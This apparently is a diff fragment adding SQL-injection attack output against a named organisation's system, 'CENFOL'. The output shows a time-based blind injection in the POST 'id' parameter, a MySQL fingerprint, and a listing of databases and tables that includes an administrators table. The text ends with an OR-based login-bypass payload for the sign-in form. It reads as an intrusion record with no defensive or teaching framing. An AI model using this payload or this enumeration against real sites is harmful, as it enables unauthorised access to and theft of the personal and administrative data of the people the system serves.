@@ -8,6 +8,28 @@ CENFOL - Christian Formation and Leadership Centers - CENFOL
 
 CENFOL System / CENFOL Labs
 
+Parameter: id (POST)
+
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    
+the back-end DBMS: MySQL >= 5.0.12 (Percona fork)
+
+available databases [2]:
+[+] information_schema
+[+] movetejo_sgibd
+
+Database: movetejo_sgibd
+[7 tables]
++-----------------+
+| administradores |
+| capacitaciones  |
+| grupos_vida     |
+| integrantes     |
+| ministerios     |
+| movimientos     |
+| sede            |
++-----------------+
+
 Sign In
 
 id='=''OR'&password='=''OR'
